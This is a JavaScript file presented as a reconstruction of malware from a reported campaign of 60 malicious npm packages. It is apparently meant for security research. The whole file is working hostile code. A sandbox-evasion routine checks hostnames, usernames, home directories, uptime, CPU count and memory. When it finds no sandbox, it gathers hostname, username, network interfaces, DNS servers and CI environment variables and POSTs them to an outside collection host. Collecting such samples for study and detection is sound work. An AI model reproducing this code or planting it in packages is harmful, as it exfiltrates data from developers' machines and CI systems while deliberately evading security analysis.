// anti-sandbox-evasion — reconstructed from public security analyses
// Source: https://socket.dev/blog/60-malicious-npm-packages-leak-network-and-host-data
//
// Part of 60-package campaign with extensive anti-sandbox evasion.
// Checks for cloud hostnames, research VM patterns, and known
// sandbox usernames before exfiltrating data.
//
// Technique: Anti-sandbox checks + conditional exfiltration

const https = require("https");
const os = require("os");
const dns = require("dns");

// Anti-sandbox: check for cloud/research hostnames
function isSandbox() {
  var hostname = os.hostname().toLowerCase();

  // AWS, GCP, known sandbox providers
  if (hostname.includes("compute.amazonaws.com")) return true;
  if (hostname.includes("bc.googleusercontent.com")) return true;
  if (hostname.includes("default-rdns.vocus.co.nz")) return true;
  if (hostname.includes("sandbox")) return true;
  if (hostname.includes("malware")) return true;
  if (hostname.includes("analysis")) return true;

  // Known research VM usernames
  var user = os.userInfo().username.toLowerCase();
  if (user === "justin" || user === "mal_data" || user === "malicious" || user === "sandbox") return true;

  // Known research VM home directories
  var home = os.homedir().toLowerCase();
  if (home.includes("mal_data") || home.includes("malicious")) return true;

  // Check uptime — sandboxes often have very low uptime
  if (os.uptime() < 120) return true;

  // Check CPU count — sandboxes often have 1-2 CPUs
  if (os.cpus().length <= 1) return true;

  // Check memory — sandboxes often have < 2GB
  if (os.totalmem() < 2 * 1024 * 1024 * 1024) return true;

  return false;
}

if (!isSandbox()) {
  // Collect system info
  var data = {
    hostname: os.hostname(),
    username: os.userInfo().username,
    homedir: os.homedir(),
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    memory: Math.round(os.totalmem() / 1024 / 1024 / 1024) + "GB",
    uptime: os.uptime(),
    networkInterfaces: os.networkInterfaces(),
    dnsServers: dns.getServers(),
    env: {
      NODE_ENV: process.env.NODE_ENV,
      CI: process.env.CI,
      GITHUB_ACTIONS: process.env.GITHUB_ACTIONS,
      TRAVIS: process.env.TRAVIS,
      CIRCLECI: process.env.CIRCLECI
    }
  };

  var payload = JSON.stringify(data);
  var req = https.request({
    hostname: "collect.bbbb335656.com",
    path: "/data",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
}
